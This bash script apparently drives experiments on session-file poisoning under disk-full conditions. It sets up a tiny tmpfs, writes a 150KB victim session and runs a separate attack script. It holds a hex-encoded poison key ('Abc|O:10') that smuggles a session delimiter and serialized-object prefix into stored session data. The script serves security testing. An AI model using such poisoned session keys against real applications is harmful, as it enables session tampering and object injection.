#!/bin/bash
# wp2_diskfull2.sh - dfC/dfD with file-based big victim hex
CL=$(cd "$(dirname "$0")" && pwd)
TINY=/tmp/p2s_c2/tiny
SID=vicsid00000000000000000000000
PIPE='4162637C4F3A3130'
NOPIPE='416263444546'

python3 -c 'print(("big|s:150000:\"" + "K"*150000 + "\";").encode().hex())' > /tmp/p2s_c2/bigvictim.hex

avail() { df --output=avail -B 1 "$TINY" | tail -1 | tr -d ' '; }
setup() {
  mountpoint -q "$TINY" && umount "$TINY"
  rm -rf "$TINY"; mkdir -p "$TINY"
  mount -t tmpfs -o size=256k tmpfs "$TINY"
  dd if=/dev/zero of="$TINY/fill.bin" bs=1 count=$((256*1024 - "$1")) 2>/dev/null
  echo "  [setup] avail=$(avail)"
}

echo "== dfC: no-pipe key, 150KB victim, ~8KB free -> ENOSPC on session write =="
setup 8192
TAG=dfC_nopipe_enospc_write POISON="$NOPIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX_FILE=/tmp/p2s_c2/bigvictim.hex bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"
grep -E "Write|write" /tmp/p2s_c2/runs/dfC_nopipe_enospc_write/server_err.log | head -4

echo "== dfD: pipe key + 150KB victim + ~8KB free -> reject wipe wins over ENOSPC =="
setup 8192
TAG=dfD_pipe_bigvictim POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX_FILE=/tmp/p2s_c2/bigvictim.hex bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

umount "$TINY"
echo DISKFULL2-DONE
